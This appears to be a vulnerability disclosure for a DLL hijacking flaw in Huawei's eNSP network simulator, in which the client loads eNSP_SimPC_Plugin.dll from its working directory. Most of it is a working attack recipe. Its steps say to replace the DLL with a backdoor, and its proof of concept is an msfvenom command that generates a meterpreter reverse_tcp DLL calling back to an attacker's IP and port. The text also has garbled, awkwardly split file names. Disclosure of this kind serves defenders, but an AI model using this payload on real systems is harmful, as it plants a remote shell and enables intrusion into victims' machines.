DLL: eNSP_SimPC_Plugin.dll
Affected Process: eNSP_Client.exe
Tested on: Windows 10 Pro x64 

Description:
NSP is a scalable and graphical network simulation tool platform provided by Huawei, mainly used for software simulation of enterprise network routers and switches, perfectly presenting real device scenarios and supporting large-scale network simulation, providing users with the opportunity to simulate and learn network technology without real devices.
Huawei eNSP_ There is a security vulnerability in V100R003C00SPC100 version, which is caused by the program loading eNSP from the current working directory_ SimPC_ Plugin.dll file. Attackers can exploit this vulnerability to carry out DLL hijacking attacks.

Steps to reproduce:
1. Prepare a backdoor file called eNSP_ SimPC_ Plugin.dll
2. Replace the original eNSP with the backdoor file_ SimPC_ Plugin.dll
3. Run eNSP, the backdoor is successfully called and executed to go online

PoC Code:
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f dll -o eNSP_SimPC_Plugin.dll

Screenshots:
![image](https://github.com/12xw/eNSP/assets/94727536/f2e83f30-6dab-4fca-a2b7-42179d86ed28)
![image](https://github.com/12xw/eNSP/assets/94727536/02394ad9-ce59-4644-ad16-9b38aab0985d)
![image](https://github.com/12xw/eNSP/assets/94727536/a333ada1-23da-47a4-b463-2043ff2ebccf)
